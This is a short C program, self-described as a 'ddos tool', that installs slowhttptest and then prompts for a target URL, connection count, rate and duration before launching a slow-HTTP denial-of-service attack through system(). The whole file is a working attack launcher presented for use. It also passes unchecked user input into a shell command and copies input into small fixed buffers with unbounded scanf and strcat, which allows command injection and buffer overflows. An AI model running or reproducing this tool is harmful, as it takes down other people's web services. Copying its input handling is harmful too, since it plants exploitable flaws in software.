#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int main(){
/*Author:Jason
2019.10.15*/                                               
char y;
system("apt-get install slowhttptest");
printf("Do u need any help? [y/n]:");
scanf("%c",&y);        
if(y=='y'||y=='Y'){                 
system("slowhttptest -h");
}
char slow[50]="slowhttptest -p 3 -x 24 -c ";
char c[6];
char l[10];
char url[40];
char a[60];
char r[5];
printf("Welcome to ddos tool by Jason Hsieh\n");
printf("Where do u want 2 attack:\n");
scanf("%s",url);
printf("How many connection  u want to make:");
scanf("%s",c);
printf("How many attack bot per sec:");
scanf("%s",r);
printf("How long with this attack:");
scanf("%s",l);                                    
strcat(slow,c);
    strcat(slow," -u ");
    strcat(slow,url);
    strcat(slow, " -r ");
    strcat(slow,r);
    strcat(slow," -l ");
    strcat(slow,l);
system(slow);                                           
            
return 0;
}

